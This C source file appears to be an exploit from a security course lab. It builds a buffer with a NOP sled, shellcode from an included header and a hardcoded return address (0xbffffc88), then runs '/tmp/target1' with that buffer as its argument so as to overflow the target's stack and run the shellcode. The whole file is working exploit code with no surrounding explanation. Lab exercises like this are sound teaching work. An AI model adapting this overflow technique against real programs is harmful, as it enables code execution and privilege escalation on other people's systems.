#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
        char *args[3];
        char *env[1];




        char buf[249]; // initialise buffer

        int i; // initialise i for the loop
        int addr; // integer to hold address

        addr =  0xbffffc88 ; // address to use

        for(i = 0; i < 249;i++) {
	  if(i < (240 - strlen(shellcode))) { *(buf+i) = '\x90';   } // fill with NOPs
	   else if(i < 240 ) { *(buf+i) = shellcode[i - 240 + strlen(shellcode)]; } // fill shellcode in
	   else if(i < 244) {*(buf+i) = '\x90'; } // add filler
           else if(i < 248) { *(buf+i) = addr >> ((i-244)*8);} // add address
           else { *(buf+i) = '\x00'; } // terminate

                }


  args[0] = TARGET; args[1] = buf ; args[2] = NULL;
  env[0] = NULL;




  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}


